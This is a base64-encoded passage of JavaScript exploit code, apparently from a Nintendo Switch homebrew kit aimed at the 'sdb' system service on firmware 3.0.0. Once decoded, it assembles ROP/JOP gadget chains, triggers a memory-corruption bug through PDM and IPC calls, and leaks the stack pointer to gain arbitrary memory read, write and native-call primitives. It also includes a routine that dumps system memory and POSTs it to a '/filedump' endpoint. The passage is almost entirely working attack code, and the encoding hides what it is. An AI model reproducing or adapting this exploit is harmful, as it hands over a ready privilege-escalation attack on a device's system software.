NjQoYnVmLCAweDAxYjAsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxNzApKTsgLy8gKlogKyA3MjsgWFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMWI4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDM1MTgwKSk7IC8vICpUOyBnYXRnZXQgMTdyXHJcblx0Ly8gcGx1aGF4IGxlYWsgU1BcclxuXHRhZGQ2NChidWYsIDB4MDFjMCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDFjOCkpOyAvLyAqQzsgRFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMWM4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDM1MTgwKSk7IC8vICpEOyBnYXRnZXQgMTBcclxuXHRhZGQ2NChidWYsIDB4MDFkMCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAwMjg1MCkpOyAvLyAqRCArIDg7IGdhdGdldCA5XHJcblx0YWRkNjQoYnVmLCAweDAxZDgsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMTFiMzgpKTsgLy8gZ2F0Z2V0IDdcclxuXHRhZGQ2NChidWYsIDB4MDFlMCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDBjMCkpOyAvLyBzaGFyZWQgd2l0aCBhcmIuKlxyXG5cdGFkZDY0KGJ1ZiwgMHgwMWU4LCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MWYwKSk7IC8vIEFcclxuXHRhZGQ2NChidWYsIDB4MDFmMCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDIyOCkpOyAvLyAqQTsgZ2F0Z2V0IDUgcHRyXHJcblx0YWRkNjQoYnVmLCAweDAxZjgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxZjgpKTsgLy8gKkEgKyA4OyBCXHJcblx0YWRkNjQoYnVmLCAweDAyMDAsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxYzApKTsgLy8gKkIgKyA4OyBDXHJcblx0YWRkNjQoYnVmLCAweDAyMDgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgyMTgpKTsgLy8gKkMgKyA3MjsgRVxyXG5cdGFkZDY0KGJ1ZiwgMHgwMjEwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MTMwKSk7IC8vICpBICsgMzI7IHJldHVybiBwdHI7IHNoYXJlZCB3aXRoIGFyYi4qXHJcblx0YWRkNjQoYnVmLCAweDAyMTgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxZDgpKTsgLy8gKkU7IGdhdGdldCA3IHB0clxyXG5cdGFkZDY0KGJ1ZiwgMHgwMjIwLCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDJkOGQ0KSk7IC8vICpBICsgNDg7IGdhdGdldCA2XHJcblx0YWRkNjQoYnVmLCAweDAyMjgsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwNGRlOTgpKTsgLy8gZ2F0Z2V0IDVcclxuXHQvLyBhbG1vc3QgZmlsbGVkXHJcblx0YWRkNjQoYnVmLCAweDAyOTAsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwNGEzYTgpKTsgLy8gKkQgKyAyMDA7IGdhdGdldCA4XHJcblxyXG5cdC8vYWRkNjQoYnVmLCAweDAyZTAsIDApOyAvLyAqQyArIDI4ODsgbGVha2VkIFNQXHJcblxyXG5cdC8vIHBsdWhheCBhcmIuY2FsbFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMjMwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MGMwKSk7IC8vIHNoYXJlZCB3aXRoIGFyYi4qXHJcblx0YWRkNjQoYnVmLCAweDAyMzgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgyNDApKTsgLy8gQVxyXG5cdGFkZDY0KGJ1ZiwgMHgwMjQwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MjY4KSk7IC8vICpBOyBnYXRnZXQgNSBwdHJcclxuXHRhZGQ2NChidWYsIDB4MDI0OCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDI1OCkpOyAvLyAqQSArIDg7IEJcclxuXHRhZGQ2NChidWYsIDB4MDI1MCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDI2MCkpOyAvLyAqQiAtIDg7IENcclxuXHRhZGQ2NChidWYsIDB4MDI1OCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDI2MCkpOyAvLyBwZG1OZXh0MSArIDg7IGdhdGdldCAxMSBwdHIgcHRyXHJcblx0YWRkNjQoYnVmLCAweDAyNjAsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxYjgpKTsgLy8gZ2F0Z2V0IDExIHB0cjsgc2hhcmVkIHdpdGggYXJiLipcclxuXHRhZGQ2NChidWYsIDB4MDI2OCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAxNDEwNCkpOyAvLyBnYXRnZXQgNVxyXG5cdGFkZDY0KGJ1ZiwgMHgwMjcwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MTMwKSk7IC8vIHBkbU5leHQxICsgMzI7IHJldHVybiBwdHI7IHNoYXJlZCB3aXRoIGFyYi4qXHJcblx0YWRkNjQoYnVmLCAweDAyNzgsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMTM0OWMpKTsgLy8gKkMgKyAyNDsgZ2F0Z2V0IDZcclxuXHRhZGQ2NChidWYsIDB4MDI4MCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAyODUwKSk7IC8vIHBkbU5leHQxICsgNDg7IGdhdGdldCAxMFxyXG5cclxuXHQvL2FkZDY0KGJ1ZiwgMHgwMmEwLCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MmZjNjgpKTsgLy8gKkEgKyA5NjsgY2FsbEFkZHJcclxuXHRhZGQ2NChidWYsIDB4MDJhOCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAwMmMwKSk7IC8vICpBICsgMTA0OyBnYXRnZXQgN1xyXG5cclxuXHRhZGQ2NChidWYsIDB4MDJkMCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDRkZTk4KSk7IC8vIHBkbU5leHQwOyBnYXRnZXQgOVxyXG5cclxuXHQvL2FkZDY0KGJ1ZiwgMHgwMmU4LCAwKTsgLy8gc3RvcmVBZGRyOyByZXR1cm5lZCBYMFxyXG5cdC8vYWRkNjQoYnVmLCAweDAyZjAsIDApOyAvLyBzdG9yZUFkZHIrODsgcmV0dXJuZWQgWDFcclxuXHJcblxyXG5cdGFkZDY0KGJ1ZiwgMHgwMzAwLCBbMHgxMTIyMzM0NCwgMF0pOyAvLyB0ZXN0aW5nIHZhbHVlIHRvIHJlYWQgb3V0XHJcblxyXG5cdHV0aWxzLmxvZyhcIndyaXRlUGRtIC4uLlwiKTtcclxuXHR3cml0ZVBkbShidWYpOyAvLyBzZWVtcyBsaWtlIGl0IHdvcmtzIHJlbGlhYmx5IG9ubHkgb25jZVxyXG5cclxuXHRrZXkgPSBjNjR0bzgoW3RoaXMucGRtX2Jhc2UsIFsweGRlMDAwMDgwLCAwXV0pO1xyXG5cclxuXHR2YXIgcGF5bG9hZCA9IG5ldyBVaW50OEFycmF5KDQ4KTtcclxuXHRhZGQ2NChwYXlsb2FkLCAyNCwgdGhpcy5zZGJfYmFzZSk7IC8vIDMyYml0IExTQiBpcyBraW5kYSBsaW1pdGVkLCBzbyBpcyAzMmJpdCBNU0JcclxuXHJcblx0QWRkT3JSZXBsYWNlKHRoaXMuaGFuZGxlLCBrZXksIHBheWxvYWQsIHRoaXMuYXV0aG9yaWQpO1xyXG5cclxuXHR1dGlscy5sb2coXCJ0cmlnZ2VyIC4uLlwiKTtcclxuXHRNb3ZlKHRoaXMuaGFuZGxlLCBrZXksIDEwMCk7XHJcblxyXG5cdHV0aWxzLmxvZyhcImNsZWFudXAgLi4uXCIpO1xyXG5cdHNjLnN2Y0Nsb3NlSGFuZGxlKHRoaXMuaGFuZGxlKTtcclxuXHRzYy5raWxsQXV0b0hhbmRsZSgpO1xyXG5cclxuXHQvLyBwcmVwYXJlXHJcblx0dXRpbHMubG9nKFwiZW50ZXJpbmcgcGx1aGF4IC4uLlwiKTtcclxuXHJcblx0Ly8gYXJiLnJlYWQgYW5kIGFyYi53cml0ZVxyXG5cdHRoaXMuaXBjR2F0MSA9IHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMGYxOTQpO1xyXG5cdHRoaXMuaXBjR2F0MiA9IHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwM2Y4YTgpO1xyXG5cdHRoaXMuaXBjR2F0OSA9IHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMzA0YzApO1xyXG5cdHRoaXMuaXBjR2F0MTNyID0gdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAyZDhkNCk7XHJcblx0dGhpcy5pcGNHYXQxM3cgPSB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDI5YjUwKTtcclxuXHR0aGlzLnBkbUVudHJ5ID0gdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDAwYjApOyAvLyBKT1AgY2hhaW47IHNoYXJlZCBmb3IgYXJiLnJlYWQgYW5kIGFyYi53cml0ZVxyXG5cdHRoaXMucGRtTmV4dCA9IHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgwMTI4KTsgLy8gc2Vjb25kIHN0YWdlIEpPUCBjaGFpbiBmb3IgYXJiLnJlYWQ7IG9mZnNldCA4ICg9MHgxMzApXHJcblxyXG5cdC8vIHNwIGxlYWtcclxuXHR0aGlzLnBkbUxlYWtFID0gdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDFlMCk7XHJcblxyXG5cdC8vIGFyYi5jYWxsXHJcblx0dGhpcy5wZG1DYWxsRSA9IHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgyMzApO1xyXG5cclxuXHQvLyBzaGFyZWQgZm9yIGFsbCBjYWxscyAob3IgaWdub3JlZCBpbiBzb21lKVxyXG5cdHRoaXMuaXBjRGF0YSA9IG5ldyBVaW50MzJBcnJheSgyNCk7XHJcblx0dGhpcy5pcGNEYXRhWzE1XSA9IHRoaXMuaXBjR2F0MVswXTtcclxuXHR0aGlzLmlwY0RhdGFbMTZdID0gdGhpcy5pcGNHYXQxWzFdO1xyXG5cdHRoaXMuaXBjRGF0YVsxN10gPSB0aGlzLmlwY0dhdDlbMF07XHJcblx0dGhpcy5pcGNEYXRhWzE4XSA9IHRoaXMuaXBjR2F0OVsxXTtcclxuXHR0aGlzLmlwY0RhdGFbMTldID0gdGhpcy5pcGNHYXQyWzBdO1xyXG5cdHRoaXMuaXBjRGF0YVsyMF0gPSB0aGlzLmlwY0dhdDJbMV07XHJcblxyXG5cdC8vIHJ1blxyXG5cdHV0aWxzLmxvZyhcInRyaWdnZXIgLi4uXCIpOyAvLyByZXR1cm4gYWRkcmVzczogMHgwMjBDODRcclxuXHJcblx0Ly8gZ2V0IFNQXHJcblx0dGhpcy5zZGJQbHVTUCA9IHRoaXMuZ2V0U1AoKTtcclxuXHR1dGlscy5sb2coXCJwbHVTUCBhdCBcIiArIHV0aWxzLnBhZGRyKHRoaXMuc2RiUGx1U1ApKTtcclxuXHJcblx0Ly8gYXJiLmNhbGwgLSBwcmVwYXJlIHN0YWNrIChwZXJtYW5lbnQ7IG1heWJlIGNoZWNrIGFmdGVyIHNvbWUgY2FsbHM/KVxyXG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgyZTgpLCB1dGlscy5hZGQyKHRoaXMuc2RiUGx1U1AsIDIwMCkpOyAvLyBzdG9yZUFkZHIgKHBkbU5leHQwKzI0KVxyXG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHg1NzlhOCksIHV0aWxzLmFkZDIodGhpcy5zZGJQbHVTUCwgMjE2KSk7IC8vIFJPUCBjaGFpbiAwXHJcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAxZDQ0KSwgdXRpbHMuYWRkMih0aGlzLnNkYlBsdVNQLCAyNDgpKTsgLy8gUk9QIGNoYWluIDFcclxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4NGU5NTApLCB1dGlscy5hZGQyKHRoaXMuc2RiUGx1U1AsIDI5NikpOyAvLyBST1AgY2hhaW4gMlxyXG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgxYTBiOCksIHV0aWxzLmFkZDIodGhpcy5zZGJQbHVTUCwgNDg4KSk7IC8vIFJPUCBjaGFpbiAzXHJcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDNjYTFjKSwgdXRpbHMuYWRkMih0aGlzLnNkYlBsdVNQLCA3NzYpKTsgLy8gZ2F0Z2V0IDhcclxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MmQwKSwgdXRpbHMuYWRkMih0aGlzLnNkYlBsdVNQLCA0NTYpKTsgLy8gcGRtTmV4dDBcclxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MjUwKSwgdXRpbHMuYWRkMih0aGlzLnNkYlBsdVNQLCA3NjApKTsgLy8gcGRtTmV4dDFcclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLmdldFNQID0gZnVuY3Rpb24oKSB7XHJcblx0Ly8gdGhlcmUgaXMgYW4gb2Zmc2V0IGJldHdlZW4gcmV0dXJuZWQgdmFsdWUgYW5kIGFjdHVhbHkgc2F2ZWQgb25lXHJcblx0Ly8gaSBkbyBub3Qga25vdyBpZiBpdCBpcyBwb3NzaWJsZSB0byBnZXQgcmFuZG9tIGFkZHJlcyB0aGF0IHdpbGwgbWFrZSB0aGlzIGZhaWxcclxuXHQvLyBpZiBzbywganVzdCB1c2UgcmVhZDQgb24gdGhpcy5wZG1fYmFzZSArIDB4MmUwIGFuZCBmcm9tIHJlc3VsdCBzdWJ0cmFjdCAweDNBOCBpbnN0ZWFkXHJcblxyXG5cdHRoaXMuaXBjRGF0YVs1XSA9IHRoaXMucGRtTGVha0VbMF07XHJcblx0dGhpcy5pcGNEYXRhWzZdID0gdGhpcy5wZG1MZWFrRVsxXTtcclxuXHJcblx0dmFyIHNwID0gWzAsMF1cclxuXHR2YXIgaXBjID0gc2MuaXBjTXNnKDEpO1xyXG5cdGlwYy5kYXRhdTMyLmFwcGx5KGlwYywgdGhpcy5pcGNEYXRhKTtcclxuXHRzcFswXSA9IGlwYy5zZW5kVG8oJ3BsOnUnKS5jbWRJZDtcclxuXHRzcFsxXSA9IHRoaXMucmVhZDQodXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDJlMCArIDQpKTsgLy8gMzJiaXQgTVNCXHJcblxyXG5cdHJldHVybiB1dGlscy5zdWIyKHNwLCAweDMyOCk7XHJcbn1cclxuXHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5pbml0aWFsaXplID0gZnVuY3Rpb24oc2MpIHtcclxuXHRpZiAodGhpcy5pbml0aWFsaXplZCkge1xyXG5cdFx0dXRpbHMubG9nKCdBbHJlYWR5IGluaXRpYWxpemVkLi4ucmV0dXJuaW5nLicpO1xyXG5cdFx0cmV0dXJuO1xyXG5cdH1cclxuXHJcblx0dGhpcy5hdXRob3JpZCA9IGdldE1paUF1dGhvcklkKCk7XHJcblx0dXRpbHMubG9nKFwiQXV0aG9yIElEOiBcIiArIEFycmF5LmFwcGx5KFtdLCB0aGlzLmF1dGhvcmlkKS5qb2luKFwiLFwiKSk7XHJcblxyXG5cdHRoaXMucmVzZXRNb2R1bGUoKTtcclxuXHR0aGlzLnNldHVwQnVmZmVycygpO1xyXG5cclxuXHQvLyB3cml0ZSAvIHJlYWQgdGVzdFxyXG5cdHZhciB0ZXN0QWRkciA9IHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgzMDApO1xyXG5cclxuXHQvLyB3cml0ZSB2YWx1ZVxyXG5cdHV0aWxzLmxvZyhcIi4uLiB3cml0ZVwiKTtcclxuXHR0aGlzLndyaXRlOChbMHgyOTkxMEJBRiwgMHgxMTIyMzM0NF0sIHRlc3RBZGRyKTtcclxuXHQvLyByZWFkIGJhY2tcclxuXHR1dGlscy5sb2coXCIuLi4gcmVhZFwiKTtcclxuXHR2YXIgcmV0VmFsID0gdGhpcy5yZWFkOCh0ZXN0QWRkcik7XHJcblx0dXRpbHMubG9nKFwicmVhZCB2YWx1ZTogXCIgKyB1dGlscy5wYWRkcihyZXRWYWwpKTtcclxuXHJcblx0dXRpbHMubG9nKCcuLi4gY2FsbCcpO1xyXG5cdHV0aWxzLmxvZygnY2FsbDogJyArIHV0aWxzLnBhZGRyKHRoaXMuc2xvd0NhbGwoMHgwMjg2OCwgW1sweEYwMEQxMjM0LCAweDExMjJhYWJiXV0pKSk7XHJcblxyXG5cdGlmICh0aGlzLnZlcnMgPT0gJzMuMC4wJykge1xyXG5cdFx0dXRpbHMubG9nKCdTZXR0aW5nIHVwIFJPIGhheC4uLicpO1xyXG5cdFx0dGhpcy5zZXR1cF9yb19oYXgoKTtcclxuXHR9XHJcblxyXG5cdHRoaXMuaW5pdGlhbGl6ZWQgPSB0cnVlO1xyXG59O1xyXG5cclxuc2RiY29yZS5wcm90b3R5cGUuZ2V0X29mZnNldHMgPSBmdW5jdGlvbigpIHtcclxuXHR2YXIgb2Zmc2V0X2RpYyA9IHtcclxuXHRcdCczLjAuMCcgOiB7XHJcblx0XHRcdCdtZW1jcHknIDogMHgzYTVmOCwgXHJcblx0XHRcdCdzdmNfZGljJyA6IHtcclxuXHRcdFx0XHQweDIgOiAweDJmYmY4LFxyXG5cdFx0XHRcdDB4MyA6IDB4MmZjMDAsXHJcblx0XHRcdFx0MHg0IDogMHgyZmMwOCxcclxuXHRcdFx0XHQweDUgOiAweDJmYzEwLFxyXG5cdFx0XHRcdDB4NiA6IDB4MmZjMTgsXHJcblx0XHRcdFx0MHg3IDogMHgyZmMzMCxcclxuXHRcdFx0XHQweDggOiAweDJmYzNjLFxyXG5cdFx0XHRcdDB4OSA6IDB4MmZjNTAsXHJcblx0XHRcdFx0MHhBIDogMHgyZmM1OCxcclxuXHRcdFx0XHQweEIgOiAweDJmYzYwLFxyXG5cdFx0XHRcdDB4QyA6IDB4MmZjNjgsXHJcblx0XHRcdFx0MHgxMCA6IDB4MmZjODAsXHJcblx0XHRcdFx0MHgxMiA6IDB4MmZjODgsXHJcblx0XHRcdFx0MHgxMyA6IDB4MmZjOTAsXHJcblx0XHRcdFx0MHgxNCA6IDB4MmZjOTgsXHJcblx0XHRcdFx0MHgxNiA6IDB4MmZjYTAsXHJcblx0XHRcdFx0MHgxOCA6IDB4MmZjYTgsXHJcblx0XHRcdFx0MHgxOSA6IDB4MmZjYzAsXHJcblx0XHRcdFx0MHgxQSA6IDB4MmZjYzgsXHJcblx0XHRcdFx0MHgxQiA6IDB4MmZjZDAsXHJcblx0XHRcdFx0MHgxQyA6IDB4MmZjZDgsXHJcblx0XHRcdFx0MHgxRCA6IDB4MmZjZTAsIFxyXG5cdFx0XHRcdDB4MUYgOiAweDJmY2U4LFxyXG5cdFx0XHRcdDB4MjEgOiAweDJmZDAwLFxyXG5cdFx0XHRcdDB4MjIgOiAweDJmZDA4LFxyXG5cdFx0XHRcdDB4MjUgOiAweDJmZDEwLFxyXG5cdFx0XHRcdDB4MjYgOiAweDJmZDI4LFxyXG5cdFx0XHRcdDB4MjcgOiAweDJmZDMwLFxyXG5cdFx0XHRcdDB4MjggOiAweDJmZDM4LFxyXG5cdFx0XHRcdDB4MjkgOiAweDJmZDQwLFxyXG5cdFx0XHRcdDB4MmMgOiAweDJmZDU4LCBcclxuXHRcdFx0XHQweDJkIDogMHgyZmQ2MCwgXHJcblx0XHRcdFx0MHg0MCA6IDB4MmZkODAsXHJcblx0XHRcdFx0MHg0MSA6IDB4MmZkYTAsXHJcblx0XHRcdFx0MHg0MyA6IDB4MmZkYjgsXHJcblx0XHRcdFx0MHg0NCA6IDB4MmZkZDAsXHJcblx0XHRcdFx0MHg1MCA6IDB4MmZkNjhcclxuXHRcdFx0fVxyXG5cdFx0fVxyXG5cdH07XHJcblx0aWYgKHRoaXMudmVycyBpbiBvZmZzZXRfZGljKSB7XHJcblx0XHRyZXR1cm4gb2Zmc2V0X2RpY1t0aGlzLnZlcnNdO1xyXG5cdH1cclxuXHRyZXR1cm4gbnVsbDtcclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLm1lbWR1bXAgPSBmdW5jdGlvbihzdGFydCwgdG90YWxTaXplLCBuYW1lKSB7XHJcblx0dmFyIGVuZCA9IHV0aWxzLmFkZDIoc3RhcnQsIHRvdGFsU2l6ZSk7XHJcblx0aWYgKGFyZ3VtZW50cy5sZW5ndGggPT0gMikge1xyXG5cdFx0bmFtZSA9ICdtZW1kdW1wc19zZGIvc2RiIC0gJyt1dGlscy5wYWRkcihzdGFydCkgKyAnIC0gJyArIHV0aWxzLnBhZGRyKGVuZCkgKyAnLmJpbic7XHJcblx0fVxyXG5cclxuXHR2YXIgYnVmID0gbmV3IFVpbnQzMkFycmF5KDggKiAxMDI0ICogMTAyNCAvIDQpO1xyXG5cdHZhciBhZGRyID0gc2MucmVhZDgoc2MuZ2V0QWRkcihidWYpLCA0KTtcclxuXHJcblx0dXRpbHMubG9nKCdEdW1waW5nIG1lbW9yeSB0byAnK25hbWUrJyEnKTtcclxuXHRmb3IodmFyIGlkeCA9IDA7IGlkeCA8IHRvdGFsU2l6ZTsgaWR4ICs9IDB4NzAwMDAwKSB7XHJcblx0XHRzaXplID0gdG90YWxTaXplIC0gaWR4O1xyXG5cdFx0c2l6ZSA9IHNpemUgPiAweDcwMDAwMCA/IDB4NzAwMDAwIDogc2l6ZTtcclxuXHRcdHRoaXMuc2MuZ2MoKTtcclxuXHRcdHZhciBvYmogPSBuZXcgc2Rib3duKGJ1Zik7XHJcblx0XHR2YXIgYmFzZSA9IHRoaXMubGVha1ByZXYoOCk7XHJcblx0XHR2YXIgc2RiYnVmID0gdXRpbHMuYWRkMihiYXNlLCAweDEwMDAwMCk7XHJcblxyXG5cdFx0dGhpcy5zbG93Q2FsbCh0aGlzLm9mZnNldHNbJ21lbWNweSddLCBbc2RiYnVmLCBzdGFydCwgc2l6ZV0pO1xyXG5cdFx0b2JqLnN2Yy5sZWFrKCk7XHJcblxyXG5cdFx0dGhpcy5zYy5tZW12aWV3KHV0aWxzLmFkZDIoYWRkciwgMHgxMDAwMDApLCBzaXplLCBmdW5jdGlvbihhYikge1xyXG5cdFx0XHR2YXIgdmlldyA9IG5ldyBVaW50OEFycmF5KGFiKTtcclxuXHRcdFx0dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO1xyXG5cdFx0XHR4aHIub3BlbignUE9TVCcsICcvZmlsZWR1bXAnLCBmYWxzZSk7XHJcblx0XHRcdHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyk7XHJcblx0XHRcdHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uJywgbmFtZSk7XHJcblx0XHRcdHhoci5zZW5kKHZpZXcpO1xyXG5cdFx0fSk7XHJcblx0fVxyXG5cdHRoaXMuc2MuZ2MoKTtcclxuXHR1dGlscy5sb2coJ0R1bXBlZCBtZW1vcnkgc3VjY2VzZnVsbHkhJyk7XHJcbn07XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5zbG93Q2FsbCA9IGZ1bmN0aW9uKGZ1bmNwdHIsIGFyZ3MsIGZhcmdzLCBkdW1wX3JlZ3MpIHtcclxuXHRpZih0eXBlb2YoZnVuY3B0cikgPT0gJ251bWJlcicpIHtcclxuXHRcdGZ1bmNwdHIgPSB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIGZ1bmNwdHIpO1xyXG5cdH1cclxuXHRzd2l0Y2goYXJndW1lbnRzLmxlbmd0aCkge1xyXG5cdGNhc2UgMTpcclxuXHRcdGFyZ3MgPSBbXTtcclxuXHRjYXNlIDI6XHJcblx0XHRmYXJncyA9IFtdO1xyXG5cdGNhc2UgMzpcclxuXHRcdGR1bXBfcmVncyA9IGZhbHNlO1xyXG5cdH1cclxuXHJcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCBhcmdzLmxlbmd0aDsgaSsrKSB7XHJcblx0XHRpZiAodHlwZW9mKGFyZ3NbaV0pID09ICdudW1iZXInKSB7XHJcblx0XHRcdGFyZ3NbaV0gPSBbYXJnc1tpXSwgMF07XHJcblx0XHR9XHJcblx0fVxyXG5cclxuXHR2YXIgc2NyYXRjaE9mZiA9IDA7XHJcblxyXG5cdC8vIFdyaXRlIHJlZ2lzdGVycyBmb3IgbmF0aXZlIGNvZGUuXHJcblx0aWYoYXJncy5sZW5ndGggPiAwKSB7XHJcblx0XHRmb3IodmFyIGkgPSAwOyBpIDwgOCAmJiBpIDwgYXJncy5sZW5ndGg7IGkrKykge1xyXG5cdFx0XHRpZihBcnJheUJ1ZmZlci5pc1ZpZXcoYXJnc1tpXSkgfHwgYXJnc1tpXSBpbnN0YW5jZW9mIEFycmF5QnVmZmVyKSB7XHJcblx0XHRcdFx0dmFyIHNpemUgPSBhcmdzW2ldLmJ5dGVMZW5ndGg7XHJcblx0XHRcdFx0dmFyIHNhZGRyID0gdXRpbHMuYWRkMih0aGlzLnNjcmF0Y2gsIHNjcmF0Y2hPZmYpO1xyXG5cdFx0XHRcdHRoaXMubWVtY3B5RnJvbUJyb3dzZXIoc2FkZHIsIHNjLmdldEFycmF5QnVmZmVyQWRkcihhcmdzW2ldKSwgc2l6ZSk7XHJcblx0XHRcdFx0dGhpcy53cml0ZTgoc2FkZHIsIHV0aWxzLmFkZDIodGhpcy5zZGJQbHVTUCwgMTI4ICsgOCAqIGkpKTtcclxuXHRcdFx0XHRzY3JhdGNoT2ZmICs9IHNpemU7XHJcblx0XHRcdFx0aWYoc2NyYXRjaE9mZiAmIDB4NylcclxuXHRcdFx0XHRcdHNjcmF0Y2hPZmYgPSAoc2NyYXRjaE9mZiAmIDB4RkZGRkZGRjgpICsgODtcclxuXHRcdFx0fSBlbHNlXHJcblx0XHRcdFx0dGhpcy53cml0ZTgoYXJnc1tpXSwgdXRpbHMuYWRkMih0aGlzLnNkYlBsdVNQLCAxMjggKyA4ICogaSkpO1xyXG5cdFx0fVxyXG5cdH1cclxuXHJcblx0dGhpcy53cml0ZTgoZnVuY3B0ciwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDJhMCkpO1xyXG5cclxuXHR0aGlzLmlwY0RhdGFbNV0gPSB0aGlzLnBkbUNhbGxFWzBdO1xyXG5cdHRoaXMuaXBjRGF0YVs2XSA9IHRoaXMucGRtQ2FsbEVbMV07XHJcblxyXG5cdHZhciBpcGMgPSBzYy5pcGNNc2coMSk7XHJcblx0aXBjLmRhdGF1MzIuYXBwbHkoaXBjLCB0aGlzLmlwY0RhdGEpO1xyXG5cdHZhciBsbyA9IGlwYy5zZW5kVG8oJ3BsOnUnKS5jbWRJZDtcclxuXHJcblx0c2NyYXRjaE9mZiA9IDA7XHJcblx0aWYoYXJncy5sZW5ndGggPiAwKSB7XHJcblx0XHRmb3IodmFyIGkgPSAwOyBpIDwgMzAgJiYgaSA8IGFyZ3MubGVuZ3RoOyBpKyspIHtcclxuXHRcdFx0aWYoQXJyYXlCdWZmZXIuaXNWaWV3KGFyZ3NbaV0pIHx8IGFyZ3NbaV0gaW5zdGFuY2VvZiBBcnJheUJ1ZmZlcikge1xyXG5cdFx0XHRcdHZhciBzaXplID0gYXJnc1tpXS5ieXRlTGVuZ3RoO1xyXG5cdFx0XHRcdHZhciBzYWRkciA9IHV0aWxzLmFkZDIodGhpcy5zY3JhdGNoLCBzY3JhdGNoT2ZmKTtcclxuXHRcdFx0XHR0aGlzLm1lbWNweVRvQnJvd3NlcihzYy5nZXRBcnJheUJ1ZmZlckFkZHIoYXJnc1tpXSksIHNhZGRyLCBzaXplKTtcclxuXHRcdFx0XHRzY3JhdGNoT2ZmICs9IHNpemU7XHJcblx0XHRcdFx0aWYoc2NyYXRjaE9mZiAmIDB4NylcclxuXHRcdFx0XHRcdHNjcmF0Y2hPZmYgPSAoc2NyYXRjaE9mZiAmIDB4RkZGRkZGRjgpICsgODtcclxuXHRcdFx0fVxyXG5cdFx0fVxyXG5cdH1cclxuXHRyZXR1cm4gW2xvLCB0aGlzLnJlYWQ0KHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgyZTggKyA0KSldO1xyXG59O1xyXG5cclxuc2RiY29yZS5wcm90b3R5cGUucmVhZDggPSBmdW5jdGlvbihhZGRyKSB7XHJcblx0cmV0dXJuIFt0aGlzL